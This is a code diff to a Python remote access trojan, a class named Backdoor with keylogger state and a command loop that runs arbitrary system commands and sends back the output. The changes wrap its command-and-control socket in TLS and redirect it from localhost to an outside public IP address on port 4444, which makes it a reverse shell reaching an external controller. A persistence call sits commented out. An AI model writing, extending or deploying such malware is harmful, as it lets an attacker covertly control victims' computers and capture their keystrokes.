@@ -3,6 +3,7 @@ import subprocess,json
 import os
 import base64
 import pynput
+import ssl
 import pyautogui
 import tempfile
 import keyboard
@@ -10,14 +11,17 @@ import sys
 import shutil
 from Browser import browser
 
-
 class Backdoor:
     def __init__(self,ip,port):
+        self.context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+        self.context.minimum_version = ssl.TLSVersion.TLSv1_2
+        self.context.maximum_version = ssl.TLSVersion.TLSv1_3
+        self.context.load_verify_locations('server-cert.pem')
         self.connection=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        self.connection= self.context.wrap_socket(self.connection, server_hostname='smitk')
         self.connection.connect((ip,port))
         self.reliable_send("bakara")
-        # self.add_persistent()
-        self.keylogger_listener=None
+        # self.add_persistent()c
         # self.keylogger_thread=None
         self.keylogger_log="Keylogger is off"
         self.keylogger_previous_command=""
@@ -165,8 +169,8 @@ class Backdoor:
                 else:
                     command_result=self.execute_system_command(command).decode("utf-8")
             except Exception as e:
-                command_result="[-] %s"%str(e)
+                command_result="[-] Bakara ERR : \n%s"%str(e)
             self.reliable_send(command_result)
 
-my_backdoor=Backdoor("localhost",4444)
+my_backdoor=Backdoor("20.235.254.229",4444)
 my_backdoor.run()
